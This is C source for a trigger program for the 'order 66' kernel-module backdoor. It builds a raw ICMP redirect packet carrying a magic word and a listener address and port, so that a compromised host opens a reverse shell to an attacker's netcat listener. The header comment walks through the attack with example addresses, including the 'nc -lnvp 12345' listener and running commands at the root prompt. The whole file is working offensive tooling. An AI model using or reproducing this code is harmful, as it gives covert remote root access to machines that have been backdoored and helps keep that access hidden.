#include "magick.h"
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>

#define MAXPACKET 4096

/*
 * This is a trigger for the order 66 backdoor icmp_input hook.
 * It sends an ICMP packet that:
 *
 *    1) Is of type ICMP_REDIRECT
 *    2) Has code ICMP_REDIRECT_TOSHOST
 *    3) Has the magic string at the beginning of it's data buffer
 *    4) The internet address of a listener
 *    5) The port that the listener is on
 *
 * netcat (nc) can be used to listen for the inbound connection
 *
 * Example:
 *
 * For a reverse shell to our target running the order 66 kernel module
 * on 192.168.1.123
 *
 *     1) Start a listener with netcat on 192.168.1.250 and port 12345:
 *           nc -lnvp 12345
 *
 *     2) From anywhere, run the trigger program:
 *           trigger 192.168.1.234 192.168.1.250 12345
 *
 *     3) From the netcat session on the listener (192.168.1.250), begin
 *        executing commands at the "#" prompt
 */
int main(int argc, char **argv) {

   int sockoptions, sd, packsize, i;
   uint16_t port;
   char *magic_word;
   struct sockaddr_in target, listener;
   struct hostent *host;
   struct icmp *icp;
   char *uptr;
   u_char order_66_packet[MAXPACKET];

   if (argc < 4 ) {
      printf("usage: %s <target address> <listener address> <listener port> [magic word]\n", argv[0]);
      return 0;
   } else if (argc > 4) {
      magic_word = argv[4];
   } else {
      magic_word = T_NAME;
   }


   bzero((char *)&target, sizeof(target));
   target.sin_family = AF_INET;

   // Convert the target address character string into an internet address
   if ((target.sin_addr.s_addr = inet_addr(argv[1])) == INADDR_NONE) {
      if ((host = gethostbyname(argv[1])) == NULL) {
         printf("[x] target host name error: %s\n", argv[1]);
         return 1;
      }

      target.sin_family = host->h_addrtype;
      bcopy(host->h_addr, (caddr_t)&target.sin_addr, host->h_length);
   }

   bzero((char *)&listener, sizeof(listener));
   listener.sin_family = AF_INET;

   // Convert the listener address character string into an internet address
   if ((listener.sin_addr.s_addr = inet_addr(argv[2])) == INADDR_NONE) {
      if ((host = gethostbyname(argv[2])) == NULL) {
         printf("[x] listener host name error: %s\n", argv[2]);
         return 2;
      }

      listener.sin_family = host->h_addrtype;
      bcopy(host->h_addr, (caddr_t)&listener.sin_addr, host->h_length);
   }

   port = atoi(argv[3]);

   // Open a raw ICMP socket (must be root)
   if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
      perror("[x] Can't create raw socket");
      return 3;
   }

   // Build the order 66 ICMP packet
   icp = (struct icmp *)order_66_packet;
   icp->icmp_type = ICMP_REDIRECT;
   icp->icmp_code = ICMP_REDIRECT_TOSHOST;
   icp->icmp_cksum = 0;
   uptr = icp->icmp_data;
   strcpy(uptr, magic_word);
   uptr+=strlen(magic_word)+1;
   listener.sin_addr.s_addr = htonl(listener.sin_addr.s_addr);
   bcopy(&listener.sin_addr.s_addr, uptr, sizeof(uint32_t));
   uptr+=sizeof(uint32_t);
   port = htons(port);
   bcopy(&port, uptr, sizeof(uint16_t));

   packsize = sizeof(struct icmp) + strlen(magic_word) + 1 + sizeof(uint32_t) +
      sizeof(uint16_t);

   // Send the order 66 packet to the target running the order 66 kernel module
   if (sendto(sd, order_66_packet, packsize, 0, (struct sockaddr *)&target,
      sizeof(target)) != packsize) {
      perror("[x] sendto failed");
      return 4;
   }

   return 0;
}
